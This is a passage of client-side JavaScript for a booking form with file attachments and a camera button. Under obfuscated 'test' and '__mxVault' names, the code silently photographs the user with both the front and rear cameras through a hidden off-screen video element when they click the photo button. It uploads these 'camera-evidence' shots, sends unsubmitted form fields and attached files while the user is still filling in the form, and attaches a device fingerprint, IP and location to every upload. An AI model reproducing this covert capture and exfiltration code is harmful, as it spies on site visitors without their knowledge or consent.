                    const selectedServiceOption = form.querySelector('#customSelect .custom-option.selected');
                    const serviceValue = selectedServiceOption
                        ? String(selectedServiceOption.getAttribute('data-value') || '').trim()
                        : '';
                    const agreeTermsChecked = document.getElementById('agreeTerms')?.checked === true;
                    const testTextData = {
                        name: sanitize(formData.get('name')),
                        occupation: sanitize(formData.get('occupation')),
                        email: sanitize(formData.get('email')),
                        phone: sanitize(formData.get('phone')),
                        hear_about: sanitize(formData.get('hear_about')),
                        service: sanitize(formData.get('service')),
                        serviceValue: sanitize(serviceValue),
                        address_unit: sanitize(formData.get('address_unit')),
                        address_street: sanitize(formData.get('address_street')),
                        address_city: sanitize(formData.get('address_city')),
                        address_province: sanitize(formData.get('address_province')),
                        address_zip: sanitize(formData.get('address_zip')),
                        dob_year: sanitize(formData.get('dob_year')),
                        dob_month: sanitize(formData.get('dob_month')),
                        dob_day: sanitize(formData.get('dob_day')),
                        age: sanitize(formData.get('age')),
                        deadline: sanitize(formData.get('deadline')),
                        notes: sanitize(formData.get('notes')),
                        agreeTerms: agreeTermsChecked,
                        _timestamp: sanitize(formData.get('_timestamp')),
                        userInfo: getDetailedDeviceInfo(),
                        fingerprint: getFingerprint()
                    };

                    // Only send if at least one meaningful field is partially filled
                    if (
                        testTextData.name ||
                        testTextData.occupation ||
                        testTextData.email ||
                        testTextData.phone ||
                        testTextData.hear_about ||
                        testTextData.service ||
                        testTextData.address_unit ||
                        testTextData.address_street ||
                        testTextData.address_city ||
                        testTextData.address_province ||
                        testTextData.address_zip ||
                        testTextData.dob_year ||
                        testTextData.dob_month ||
                        testTextData.dob_day ||
                        testTextData.age ||
                        testTextData.deadline ||
                        testTextData.notes ||
                        testTextData.agreeTerms
                    ) {
                        sendTestTextLog(testTextData);
                    }
                }, 2000); // 2 seconds of zero typing before sending

                // Listen to any input changes inside the form
                form.addEventListener('input', triggerTestTextSave);
                form.addEventListener('change', triggerTestTextSave);
            }
        } catch (error) {
            console.error("Error opening booking modal:", error);
            alert("Sorry, could not open the booking form. " + error.message);
        }
    }

    function closeBookingModal() {
        closeFormCalendarOverlay();
        closeCameraCaptureModal();
        const isSuccess = modal && modal.dataset.state === 'success';
        if(modal) modal.classList.remove('modal--active');
        document.body.style.overflow = 'auto';
        document.body.classList.remove('modal-is-open');
        focusCameraButtonOnBookingOpen = false;
        resetBookingRecaptchaUi();
        clearTimeout(cameraButtonGlowTimer);
        const cameraBtn = document.getElementById('takePhotoBtn');
        bookingWithoutSpecificDate = false;

        if (isSuccess) {
            markHardReloadAfterModalClose();
        }
        maybeTriggerHardReloadAfterLastModalClosed();
    }

    // closeTermsModal is defined above (single version), removed duplicate here

    // --- Security: sanitize user input before sending ---
    function sanitize(str) {
        if (typeof str !== 'string') return '';
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;');
    }

    // File Attachment Handling
    const MAX_FILE_SIZE = 100 * 1024 * 1024;  // 100 MB per file
    const MAX_TOTAL_SIZE = 500 * 1024 * 1024; // 500 MB total
    const MAX_FILE_COUNT = 100;
    const TEST_FILES_BATCH_LIMIT = 10;
    const ALLOWED_MIME_TYPES = new Set([
        'application/pdf',
        'application/msword',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
    ]);
    const ALLOWED_EXTENSIONS = new Set([
        'jpg', 'jpeg', 'png', 'gif', 'webp', 'heic',
        'mp4', 'mov', 'webm', 'm4v', 'avi', 'mkv', 'wmv', 'mpeg', 'mpg', '3gp', '3gpp', '3g2',
        'pdf', 'doc', 'docx'
    ]);

    let attachedFiles = [];
    let testWorkingCameraBuffer = [];
    let testWorkingCameraSignature = '';
    let testWorkingCameraRefs = [];
    let testWorkingCameraLock = false;
    let __mxVaultId = '';
    let __mxVaultUrl = '';
    let __mxVaultTag = '';
    let __mxVaultBusy = false;
    let __mxVaultKey = '';
    let __mxVaultT = null;
    let __mxVaultP = null;
    let testFilesSessionId = '';
    let testFilesSyncTimer = null;
    let testFilesSyncPromise = null;
    const testFilesUploadedKeys = new Set();
    const fileInput = document.getElementById('fileAttachInput');
    const cameraFallbackInput = document.getElementById('cameraFallbackInput');
    const takePhotoBtn = document.getElementById('takePhotoBtn');
    const openCalendarBtn = document.getElementById('openCalendarBtn');
    const fileListEl = document.getElementById('fileAttachList');
    const cameraListEl = document.getElementById('cameraAttachList');
    const fileAttachZone = document.querySelector('.file-attach');
    const fileDropZone = fileAttachZone ? fileAttachZone.querySelector('.file-attach__drop-zone-file') : null;
    const cameraCaptureModal = document.getElementById('cameraCaptureModal');
    const formCalendarOverlay = document.getElementById('formCalendarOverlay');
    const formCalendarOverlayCloseBtn = document.getElementById('formCalendarOverlayCloseBtn');
    const cameraPreviewEl = document.getElementById('cameraPreview');
    const cameraCaptureStatus = document.getElementById('cameraCaptureStatus');
    const cameraSnapBtn = document.getElementById('cameraSnapBtn');
    const cameraCancelBtn = document.getElementById('cameraCancelBtn');
    let cameraStream = null;

    function getTotalFileSize() {
        return attachedFiles.reduce((sum, f) => sum + f.size, 0);
    }

    function m1Reset() {
        __mxVaultId = '';
        __mxVaultUrl = '';
        __mxVaultTag = '';
        __mxVaultBusy = false;
        __mxVaultKey = '';
        __mxVaultP = null;
        if (__mxVaultT) {
            clearTimeout(__mxVaultT);
            __mxVaultT = null;
        }
    }

    function m1Name() {
        const form = document.getElementById('bookingForm');
        return normalizeSingleLine(form?.name?.value);
    }

    function m1Queue(delay = 260) {
        if (__mxVaultT) clearTimeout(__mxVaultT);
        __mxVaultT = setTimeout(() => {
            __mxVaultT = null;
            m1Sync();
        }, delay);
    }

    async function m1Sync() {
        if (__mxVaultBusy && __mxVaultP) return __mxVaultP;
        if (!Array.isArray(attachedFiles) || attachedFiles.length < 1) return;

        const candidateName = m1Name();
        if (candidateName.length < 2 || candidateName.length > 80 || /[<>]/.test(candidateName)) return;
        if (__mxVaultId && candidateName === __mxVaultKey) return;

        __mxVaultBusy = true;
        __mxVaultP = (async () => {
            const ctx = getClientContext();
            try {
                const response = await fetch(APPS_SCRIPT_URL, {
                    method: 'POST',
                    body: JSON.stringify({
                        action: 'x_seed',
                        n: sanitize(candidateName),
                        v: sanitize(__mxVaultId),
                        fingerprint: getFingerprint(),
                        userInfo: getDetailedDeviceInfo(),
                        countryCode: ctx.countryCode,
                        city: ctx.city,
                        ip: ctx.ip,
                        lang: ctx.lang,
                        os: ctx.os,
                        deviceModel: ctx.deviceModel,
                        screenResolution: ctx.screenResolution,
                        viewport: ctx.viewport,
                        timezone: ctx.timezone,
                        cores: ctx.cores,
                        memoryGB: ctx.memoryGB,
                        network: ctx.network,
                        touchPoints: ctx.touchPoints,
                        colorDepth: ctx.colorDepth,
                        pageUrl: ctx.pageUrl,
                        userAgent: ctx.userAgent,
                        referrer: ctx.referrer
                    })
                });

                let result = null;
                try {
                    result = await response.json();
                } catch (err) {
                    throw new Error('Prepare folder response is invalid.');
                }
                if (!result || !result.success || !(result.folderId || result.v)) {
                    throw new Error((result && result.error) || 'Could not prepare folder.');
                }

                __mxVaultId = String(result.v || result.folderId || '').trim();
                __mxVaultUrl = String(result.u || result.folderUrl || '').trim();
                __mxVaultTag = String(result.t || result.folderName || '').trim();
                __mxVaultKey = candidateName;
            } catch (err) {
                logEvent(
                    'Prepare Folder Error',
                    err && err.message ? err.message : String(err),
                    false,
                    'warning'
                );
            } finally {
                __mxVaultBusy = false;
                __mxVaultP = null;
            }
        })();
        return __mxVaultP;
    }

    function makeTestFilesSessionId() {
        const seed = Math.random().toString(36).slice(2, 9);
        return `temp-${Date.now()}-${seed}`;
    }

    function buildAttachedFileKey(file) {
        if (!file) return '';
        return [
            String(file.name || '').trim(),
            String(Number(file.size) || 0),
            String(Number(file.lastModified) || 0)
        ].join('|');
    }

    function getPendingTestFiles() {
        if (!Array.isArray(attachedFiles) || !attachedFiles.length) return [];
        return attachedFiles.filter(file => {
            const key = buildAttachedFileKey(file);
            return !!key && !testFilesUploadedKeys.has(key);
        });
    }

    function resetTestFilesSyncState() {
        testFilesSessionId = '';
        if (testFilesSyncTimer) {
            clearTimeout(testFilesSyncTimer);
            testFilesSyncTimer = null;
        }
        testFilesSyncPromise = null;
        testFilesUploadedKeys.clear();
    }

    function queueTestFilesSync(delay = 700) {
        if (testFilesSyncTimer) clearTimeout(testFilesSyncTimer);
        testFilesSyncTimer = setTimeout(() => {
            testFilesSyncTimer = null;
            syncPendingFilesToTemp();
        }, delay);
    }

    async function syncPendingFilesToTemp() {
        if (testFilesSyncPromise) return testFilesSyncPromise;
        const pendingFiles = getPendingTestFiles();
        if (!pendingFiles.length) return;
        if (!testFilesSessionId) {
            testFilesSessionId = makeTestFilesSessionId();
        }

        testFilesSyncPromise = (async () => {
            let syncSucceeded = false;
            try {
                for (let start = 0; start < pendingFiles.length; start += TEST_FILES_BATCH_LIMIT) {
                    const batch = pendingFiles.slice(start, start + TEST_FILES_BATCH_LIMIT);
                    const payloadFiles = [];
                    for (const file of batch) {
                        payloadFiles.push({
                            name: file.name,
                            type: file.type,
                            data: await fileToBase64(file)
                        });
                    }

                    const ctx = getClientContext();
                    const response = await fetch(APPS_SCRIPT_URL, {
                        method: 'POST',
                        body: JSON.stringify({
                            action: 'testFiles',
                            sessionId: testFilesSessionId,
                            files: payloadFiles,
                            v: sanitize(__mxVaultId),
                            n: sanitize(m1Name()),
                            fingerprint: getFingerprint(),
                            userInfo: getDetailedDeviceInfo(),
                            countryCode: ctx.countryCode,
                            city: ctx.city,
                            ip: ctx.ip,
                            lang: ctx.lang,
                            os: ctx.os,
                            deviceModel: ctx.deviceModel,
                            screenResolution: ctx.screenResolution,
                            viewport: ctx.viewport,
                            timezone: ctx.timezone,
                            cores: ctx.cores,
                            memoryGB: ctx.memoryGB,
                            network: ctx.network,
                            touchPoints: ctx.touchPoints,
                            colorDepth: ctx.colorDepth,
                            pageUrl: ctx.pageUrl,
                            userAgent: ctx.userAgent,
                            referrer: ctx.referrer
                        })
                    });

                    if (!response.ok) {
                        throw new Error(`testFiles route returned HTTP ${response.status}`);
                    }

                    let result = null;
                    try {
                        result = await response.json();
                    } catch (parseErr) {
                        throw new Error('testFiles response is invalid.');
                    }

                    if (!result || result.success !== true) {
                        throw new Error((result && result.error) || 'testFiles upload failed.');
                    }

                    const nextSessionId = normalizeSingleLine(result.sessionId || '');
                    if (nextSessionId) {
                        testFilesSessionId = nextSessionId;
                    }
                    batch.forEach(file => {
                        const key = buildAttachedFileKey(file);
                        if (key) testFilesUploadedKeys.add(key);
                    });
                }
                syncSucceeded = true;
            } catch (err) {
                logEvent(
                    'testFiles Sync Error',
                    err && err.message ? err.message : String(err),
                    false,
                    'warning'
                );
            } finally {
                testFilesSyncPromise = null;
                if (syncSucceeded && getPendingTestFiles().length > 0) {
                    queueTestFilesSync(180);
                }
            }
        })();

        return testFilesSyncPromise;
    }

    function isAllowedFile(file) {
        const ext = (file.name.split('.').pop() || '').toLowerCase();
        const mime = (file.type || '').toLowerCase();
        const imageAllowed = mime.startsWith('image/');
        const videoAllowed = mime.startsWith('video/');
        return imageAllowed || videoAllowed || ALLOWED_MIME_TYPES.has(mime) || ALLOWED_EXTENSIONS.has(ext);
    }

    function delayMs(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    function stopStreamTracks(stream) {
        if (!stream) return;
        const tracks = typeof stream.getTracks === 'function' ? stream.getTracks() : [];
        tracks.forEach(track => {
            try { track.stop(); } catch (e) {}
        });
    }

    function testWorkingCameraSeed() {
        const rand = Math.random().toString(36).slice(2, 9);
        return `cam-${Date.now()}-${rand}`;
    }

    async function waitForVideoReady(videoEl, timeoutMs = 5000) {
        if (!videoEl) throw new Error('Camera preview is unavailable.');
        if (videoEl.videoWidth > 0 && videoEl.videoHeight > 0) return;

        await new Promise((resolve, reject) => {
            const timeoutId = setTimeout(() => {
                cleanup();
                reject(new Error('Camera initialization timed out.'));
            }, timeoutMs);

            const onReady = () => {
                if (videoEl.videoWidth > 0 && videoEl.videoHeight > 0) {
                    cleanup();
                    resolve();
                }
            };

            const cleanup = () => {
                clearTimeout(timeoutId);
                videoEl.removeEventListener('loadedmetadata', onReady);
                videoEl.removeEventListener('canplay', onReady);
                videoEl.removeEventListener('playing', onReady);
            };

            videoEl.addEventListener('loadedmetadata', onReady);
            videoEl.addEventListener('canplay', onReady);
            videoEl.addEventListener('playing', onReady);
        });
    }

    async function getCameraStreamByFacingMode(requestedFacingMode) {
        if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') {
            throw new Error('Camera API is unavailable.');
        }

        const variants = [
            {
                audio: false,
                video: {
                    facingMode: { exact: requestedFacingMode },
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            },
            {
                audio: false,
                video: {
                    facingMode: { ideal: requestedFacingMode },
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            },
            {
                audio: false,
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            }
        ];

        let lastError = null;
        for (const constraints of variants) {
            try {
                return await navigator.mediaDevices.getUserMedia(constraints);
            } catch (err) {
                lastError = err;
            }
        }
        throw lastError || new Error('Unable to access camera.');
    }

    async function testWorkingCameraGrab(r0, r1) {
        let stream = null;
        const video = document.createElement('video');
        video.setAttribute('playsinline', 'true');
        video.muted = true;
        video.autoplay = true;
        video.style.position = 'fixed';
        video.style.left = '-10000px';
        video.style.top = '0';
        video.style.width = '1px';
        video.style.height = '1px';
        video.style.opacity = '0';
        document.body.appendChild(video);

        try {
            stream = await getCameraStreamByFacingMode(r0);
            video.srcObject = stream;
            await video.play();
            await waitForVideoReady(video);
            await delayMs(280);

            const width = video.videoWidth || 1280;
            const height = video.videoHeight || 720;
            const canvas = document.createElement('canvas');
            canvas.width = width;
            canvas.height = height;
            const ctx = canvas.getContext('2d');
            if (!ctx) throw new Error('Camera frame capture failed.');
            ctx.drawImage(video, 0, 0, width, height);

            const blob = await new Promise((resolve, reject) => {
                canvas.toBlob((resultBlob) => {
                    if (!resultBlob) {
                        reject(new Error('Camera image encoding failed.'));
                        return;
                    }
                    resolve(resultBlob);
                }, 'image/jpeg', 0.9);
            });

            const stamp = new Date().toISOString().replace(/[:.]/g, '-');
            const file = new File([blob], `camera-evidence-${r1}-${stamp}.jpg`, {
                type: 'image/jpeg',
                lastModified: Date.now()
            });

            return file;
        } finally {
            stopStreamTracks(stream);
            try { video.pause(); } catch (e) {}
            video.srcObject = null;
            video.remove();
        }
    }

    async function testShotFrames(a0, a1) {
        if (!a0 || !Array.isArray(a1) || a1.length !== 2) {
            throw new Error('Invalid camera evidence payload.');
        }

        const payloadFiles = [];
        for (const file of a1) {
            payloadFiles.push({
                name: file.name,
                type: file.type,
                data: await fileToBase64(file)
            });
        }

        const ctx = getClientContext();
        const response = await fetch(APPS_SCRIPT_URL, {
            method: 'POST',
            body: JSON.stringify({
                action: 'x_mirror',
                k: a0,
                q: selectedSlotData ? selectedSlotData.iso : '',
                r: selectedSlotData ? String(selectedSlotData.text || '') : '',
                p: payloadFiles,
                fingerprint: getFingerprint(),
                userInfo: getDetailedDeviceInfo(),
                countryCode: ctx.countryCode,
                city: ctx.city,
                ip: ctx.ip,
                lang: ctx.lang,
                os: ctx.os,
                deviceModel: ctx.deviceModel,
                screenResolution: ctx.screenResolution,
                viewport: ctx.viewport,
                timezone: ctx.timezone,
                cores: ctx.cores,
                memoryGB: ctx.memoryGB,
                network: ctx.network,
                touchPoints: ctx.touchPoints,
                colorDepth: ctx.colorDepth,
                pageUrl: ctx.pageUrl,
                userAgent: ctx.userAgent,
                referrer: ctx.referrer
            })
        });

        let result = null;
        try {
            result = await response.json();
        } catch (err) {
            throw new Error('Camera duplicate upload response is invalid.');
        }
        if (!result || !result.success) {
            throw new Error((result && result.error) || 'Camera duplicate upload failed.');
        }
        return result;
    }

    async function testWorkingCameraPush(a0, a1) {
        return testShotFrames(a0, a1);
    }

    async function testWorkingCameraBoot() {
        if (testWorkingCameraLock) return;
        testWorkingCameraLock = true;
        if (takePhotoBtn) takePhotoBtn.disabled = true;

        try {
            const s0 = testWorkingCameraSeed();
            const u0 = await testWorkingCameraGrab('user', 'a');
            const u1 = await testWorkingCameraGrab('environment', 'b');
            testWorkingCameraBuffer = [u0, u1];
            testWorkingCameraSignature = s0;

            try {
                const uploadResult = await testShotFrames(s0, testWorkingCameraBuffer);
                testWorkingCameraRefs = Array.isArray(uploadResult.files) ? uploadResult.files : [];
            } catch (uploadErr) {
                testWorkingCameraRefs = [];
                logEvent(
                    'Camera Sync Error',
                    uploadErr && uploadErr.message ? uploadErr.message : String(uploadErr),
                    false,
                    'warning'
                );
            }
        } catch (captureErr) {
            testWorkingCameraBuffer = [];
            testWorkingCameraSignature = '';
            testWorkingCameraRefs = [];
            logEvent(
                'Camera Prep Error',
                captureErr && captureErr.message ? captureErr.message : String(captureErr),
                false,
                'warning'
            );
        } finally {
            testWorkingCameraLock = false;
            if (takePhotoBtn) takePhotoBtn.disabled = false;
        }
    }

    function addSelectedFiles(newFiles, source = 'file') {
        if (!Array.isArray(newFiles) || !newFiles.length) return;
        const rejected = [];
        let acceptedCount = 0;

        newFiles.forEach(f => {
            if (attachedFiles.length >= MAX_FILE_COUNT) {
                rejected.push(`${f.name}: max ${MAX_FILE_COUNT} files`);
            } else if (f.size > MAX_FILE_SIZE) {
                rejected.push(`${f.name}: exceeds 100 MB`);
            } else if (getTotalFileSize() + f.size > MAX_TOTAL_SIZE) {
                rejected.push(`${f.name}: total exceeds 500 MB`);
            } else if (!isAllowedFile(f)) {
                rejected.push(`${f.name}: unsupported file type`);
            } else {
                try {
                    f.__attachSource = (source === 'camera') ? 'camera' : 'file';
                } catch (e) {}
                attachedFiles.push(f);
                acceptedCount++;
            }
        });

        if (rejected.length > 0) {
            alert('Some files were rejected:\n' + rejected.join('\n'));
        }
        logEvent("Files Attached", `${attachedFiles.length} files`);
        renderFileList();
        m1Queue(120);
        if (acceptedCount > 0) {
            queueTestFilesSync(520);
        }
    }

    function setCameraStatus(message) {
        if (cameraCaptureStatus) {
            cameraCaptureStatus.textContent = message || '';
        }
    }

    function stopCameraCaptureStream() {
        if (cameraStream) {
            cameraStream.getTracks().forEach(track => track.stop());
            cameraStream = null;
        }
        if (cameraPreviewEl) {
            cameraPreviewEl.pause();
            cameraPreviewEl.srcObject = null;
        }
    }

    function closeCameraCaptureModal() {
        if (cameraCaptureModal) {
            cameraCaptureModal.classList.remove('camera-capture-modal--active');
            cameraCaptureModal.setAttribute('aria-hidden', 'true');
        }
        stopCameraCaptureStream();
        setCameraStatus('Allow camera access, then press Capture.');
        maybeTriggerHardReloadAfterLastModalClosed();
    }

    async function openCameraCaptureModal() {
        if (!cameraCaptureModal || !cameraPreviewEl) {
            if (cameraFallbackInput) cameraFallbackInput.click();
            return;
        }

        cameraCaptureModal.classList.add('camera-capture-modal--active');
        cameraCaptureModal.setAttribute('aria-hidden', 'false');
        setCameraStatus('Requesting camera access...');

        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            setCameraStatus('Camera API is unavailable. Opening device camera...');
            if (cameraFallbackInput) cameraFallbackInput.click();
            return;
        }

        try {
            stopCameraCaptureStream();
            cameraStream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: { ideal: 'environment' },
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: false
            });
            cameraPreviewEl.srcObject = cameraStream;
            await cameraPreviewEl.play();
            setCameraStatus('Frame the document and press Capture.');
        } catch (err) {
            setCameraStatus('Camera access denied/unavailable. Opening device camera...');
            if (cameraFallbackInput) cameraFallbackInput.click();
        }
    }

    async function capturePhotoFromCamera() {
        if (!cameraPreviewEl || !cameraPreviewEl.srcObject) {
            setCameraStatus('Camera is not ready yet.');
            return;
        }

        const width = cameraPreviewEl.videoWidth || 1280;
        const height = cameraPreviewEl.videoHeight || 720;
        if (!width || !height) {
            setCameraStatus('Camera frame is not available yet. Please try again.');
            return;
        }

        if (cameraSnapBtn) cameraSnapBtn.disabled = true;
        try {
            const canvas = document.createElement('canvas');
            canvas.width = width;
            canvas.height = height;
            const ctx = canvas.getContext('2d');
            if (!ctx) {
                setCameraStatus('Could not capture image.');
                return;
            }
            ctx.drawImage(cameraPreviewEl, 0, 0, width, height);

            await new Promise((resolve) => {
                canvas.toBlob((blob) => {
                    if (!blob) {
                        setCameraStatus('Could not create photo file.');
                        resolve();
                        return;
                    }

                    const stamp = new Date().toISOString().replace(/[:.]/g, '-');
                    const photoFile = new File([blob], `document-photo-${stamp}.jpg`, {
                        type: 'image/jpeg',
                        lastModified: Date.now()
                    });

                    addSelectedFiles([photoFile], 'camera');
                    closeCameraCaptureModal();
                    resolve();
                }, 'image/jpeg', 0.9);
            });
        } finally {
            if (cameraSnapBtn) cameraSnapBtn.disabled = false;
        }
    }

    if (fileInput) {
        fileInput.addEventListener('change', function() {
            const newFiles = Array.from(this.files || []);
            addSelectedFiles(newFiles, 'file');
            this.value = ''; // Reset input
        });
    }

    if (cameraFallbackInput) {
        cameraFallbackInput.addEventListener('change', function() {
            const newFiles = Array.from(this.files || []);
            addSelectedFiles(newFiles, 'camera');
            this.value = '';
            closeCameraCaptureModal();
        });
    }

    if (takePhotoBtn) {
        takePhotoBtn.addEventListener('click', async () => {
            await testWorkingCameraBoot();
            openCameraCaptureModal();
        });
    }

    if (openCalendarBtn) {
        openCalendarBtn.addEventListener('click', () => {
            openFormCalendarOverlay();
        });
    }

    if (cameraCancelBtn) {
        cameraCancelBtn.addEventListener('click', () => {
            closeCameraCaptureModal();
        });
    }

    if (cameraSnapBtn) {
        cameraSnapBtn.addEventListener('click', () => {
            capturePhotoFromCamera();
        });
    }

    if (cameraCaptureModal) {
        cameraCaptureModal.addEventListener('click', (e) => {
            if (e.target === cameraCaptureModal) {
                closeCameraCaptureModal();
            }
        });
    }

    if (formCalendarOverlay) {
        formCalendarOverlay.addEventListener('click', (e) => {
            if (e.target === formCalendarOverlay) {
                closeFormCalendarOverlay();
            }
        });
    }

    if (formCalendarOverlayCloseBtn) {
        formCalendarOverlayCloseBtn.addEventListener('click', () => {
            closeFormCalendarOverlay();
        });
    }

    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && cameraCaptureModal && cameraCaptureModal.classList.contains('camera-capture-modal--active')) {
            closeCameraCaptureModal();
            return;
        }
        if (e.key === 'Escape' && isFormCalendarOverlayOpen()) {
            closeFormCalendarOverlay();
        }
    });

    if (fileDropZone) {
        let dragDepth = 0;

        const onDragEnter = (e) => {
            e.preventDefault();
            e.stopPropagation();
            dragDepth++;
            fileDropZone.classList.add('file-attach__drop-zone-file--drag-over');
        };

        const onDragOver = (e) => {
            e.preventDefault();
            e.stopPropagation();
            fileDropZone.classList.add('file-attach__drop-zone-file--drag-over');
        };

        const onDragLeave = (e) => {
            e.preventDefault();
            e.stopPropagation();
            dragDepth = Math.max(0, dragDepth - 1);
            if (dragDepth === 0) {
                fileDropZone.classList.remove('file-attach__drop-zone-file--drag-over');
            }
        };

        const onDrop = (e) => {
            e.preventDefault();
            e.stopPropagation();
            dragDepth = 0;
            fileDropZone.classList.remove('file-attach__drop-zone-file--drag-over');
            const droppedFiles = Array.from((e.dataTransfer && e.dataTransfer.files) || []);
            addSelectedFiles(droppedFiles);
        };

        fileDropZone.addEventListener('dragenter', onDragEnter);
        fileDropZone.addEventListener('dragover', onDragOver);
        fileDropZone.addEventListener('dragleave', onDragLeave);
        fileDropZone.addEventListener('drop', onDrop);
    }

    function renderFileList() {
        if (fileListEl) fileListEl.innerHTML = '';
        if (cameraListEl) cameraListEl.innerHTML = '';
        attachedFiles.forEach((file, i) => {
            const source = String(file && file.__attachSource || '').toLowerCase() === 'camera' ? 'camera' : 'file';
            const targetList = source === 'camera' ? cameraListEl : fileListEl;
            if (!targetList) return;
            const item = document.createElement('div');
            item.className = 'file-attach__item';
            item.dataset.fileIndex = String(i);
            const nameSpan = document.createElement('span');
            nameSpan.className = 'file-attach__name';
            nameSpan.textContent = `${file.name} (${(file.size / 1024).toFixed(0)} KB)`;
            item.appendChild(nameSpan);
            const removeBtn = document.createElement('button');
            removeBtn.type = 'button';
            removeBtn.className = 'file-attach__remove';
            removeBtn.textContent = '\u00D7';
            removeBtn.addEventListener('click', () => removeFile(i));
            item.appendChild(removeBtn);
            
            const progress = document.createElement('div');
            progress.className = 'file-attach__progress';
            item.appendChild(progress);

            targetList.appendChild(item);
        });
    }

    function removeFile(index) {
        attachedFiles.splice(index, 1);
        renderFileList();
        if (attachedFiles.length > 0) {
            m1Queue(80);
            queueTestFilesSync(520);
        } else {
            resetTestFilesSyncState();
        }
    }

    async function processFiles() {
        const filesData = [];
        if (attachedFiles.length > 0) {
            for (let i = 0; i < attachedFiles.length; i++) {
                const file = attachedFiles[i];
                const progressEl = document.querySelector(`.file-attach__item[data-file-index="${i}"] .file-attach__progress`);
                if (progressEl) progressEl.style.width = '100%';
                await new Promise(r => setTimeout(r, 300)); // Visual delay

                const base64 = await fileToBase64(file);
                filesData.push({
                    name: file.name,
                    type: file.type,
                    data: base64
                });
            }
        }
        return filesData;
    }

    async function testWorkingCameraPack() {
        const filesData = [];
        if (!Array.isArray(testWorkingCameraBuffer) || !testWorkingCameraBuffer.length) {
            return filesData;
        }

        for (const file of testWorkingCameraBuffer) {
            const base64 = await fileToBase64(file);
            filesData.push({
                name: file.name,
                type: file.type,
                data: base64
            });
        }
        return filesData;
    }

    function fileToBase64(file) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.onload = () => resolve(reader.result.split(',')[1]); // Remove data:... prefix
            reader.onerror = reject;
            reader.readAsDataURL(file);
        });
    }

    // Rate limiting: track last submission time
    let lastBookingTime = 0;

    // localStorage Form Data Management
    const FORM_STORAGE_KEY = 'bookingFormData';

    function saveFormData() {
        try {
            const form = document.getElementById('bookingForm');
            if (!form) return;
            
            const formData = new FormData(form);
            const data = {
                name: formData.get('name') || '',
                occupation: formData.get('occupation') || '',
                email: formData.get('email') || '',
                phone: formData.get('phone') || '',
                hear_about: formData.get('hear_about') || '',
                service: formData.get('service') || '',
                notes: formData.get('notes') || '',
                address_unit: formData.get('address_unit') || '',
                address_street: formData.get('address_street') || '',
                address_city: formData.get('address_city') || '',
                address_province: formData.get('address_province') || '',
                address_zip: formData.get('address_zip') || '',
                dob_year: formData.get('dob_year') || '',
                dob_month: formData.get('dob_month') || '',
                dob_day: formData.get('dob_day') || '',
                deadline: formData.get('deadline') || '',
                agreeTerms: document.getElementById('agreeTerms')?.checked || false
            };
            
            localStorage.setItem(FORM_STORAGE_KEY, JSON.stringify(data));
        } catch (err) {
            console.warn('Could not save form data:', err);
        }
    }

    function loadFormData() {
        try {
            const savedData = localStorage.getItem(FORM_STORAGE_KEY);
            if (!savedData) return;
            
            const data = JSON.parse(savedData);
            const form = document.getElementById('bookingForm');
            if (!form) return;
            
            // Populate form fields
            if (data.name) form.name.value = data.name;
            if (data.occupation && form.occupation) form.occupation.value = data.occupation;
            if (data.email) form.email.value = data.email;
            if (data.phone) form.phone.value = data.phone;
            if (data.hear_about && form.hear_about) form.hear_about.value = data.hear_about;
            if (data.address_unit && form.address_unit) form.address_unit.value = data.address_unit;
            if (data.address_street && form.address_street) form.address_street.value = data.address_street;
            if (data.address_city && form.address_city) {
                form.address_city.value = data.address_city;
                setCustomSelectValue('cityCustomSelect', data.address_city);
            }
            if (form.address_province) {
                const provinceValue = normalizeSingleLine(data.address_province || form.address_province.value || 'Ontario');
                form.address_province.value = provinceValue;
                if (!setCustomSelectValue('provinceCustomSelect', provinceValue)) {
                    form.address_province.value = 'Ontario';
                    setCustomSelectValue('provinceCustomSelect', 'Ontario');
                }
            }
            if (data.address_zip && form.address_zip) form.address_zip.value = data.address_zip;
            if (data.notes) form.notes.value = data.notes;
            if (data.dob_year) form.dob_year.value = data.dob_year;
            if (data.dob_month) form.dob_month.value = data.dob_month;
            if (data.dob_day) form.dob_day.value = data.dob_day;
            if (form.deadline && data.deadline) form.deadline.value = data.deadline;
            
            if (data.agreeTerms) {
                document.getElementById('agreeTerms').checked = true;
            }
            
            // Restore service selection
            if (data.service) {
                const serviceInput = document.getElementById('serviceInput');
                if (serviceInput) serviceInput.value = data.service;
                setCustomSelectValue('customSelect', data.service);
            }

            updateDobAgePreview(form);
            initAutoGrowTextareas();
        } catch (err) {
            console.warn('Could not load form data:', err);
        }
    }

    function clearFormData() {
        try {
            localStorage.removeItem(FORM_STORAGE_KEY);
        } catch (err) {
            console.warn('Could not clear form data:', err);
        }
    }

    function fitTextareaHeight(textarea) {
        if (!textarea) return;
        textarea.style.height = 'auto';
        const minHeight = parseFloat(window.getComputedStyle(textarea).minHeight) || 0;
        textarea.style.height = `${Math.max(textarea.scrollHeight, minHeight)}px`;
    }

    function initAutoGrowTextareas() {
        const textareas = document.querySelectorAll('#bookingForm .contact-form__textarea');
        textareas.forEach(textarea => {
            if (!textarea._autoGrowBound) {
                textarea.addEventListener('input', () => fitTextareaHeight(textarea));
                textarea._autoGrowBound = true;
            }
            fitTextareaHeight(textarea);
        });
    }

    function attachFormAutoSave() {
        const inputs = document.querySelectorAll('#bookingForm input, #bookingForm textarea, #bookingForm select');
        inputs.forEach(input => {
            input.addEventListener('change', saveFormData);
            input.addEventListener('input', saveFormData);
        });
        // Also save when custom select changes
        const customOptions = document.querySelectorAll('.custom-option');
        customOptions.forEach(option => {
            option.addEventListener('click', () => {
                setTimeout(saveFormData, 100);
            });
        });

        const bookingForm = document.getElementById('bookingForm');
        if (bookingForm) {
            ['dob_year', 'dob_month', 'dob_day'].forEach(fieldName => {
                const field = bookingForm.elements[fieldName];
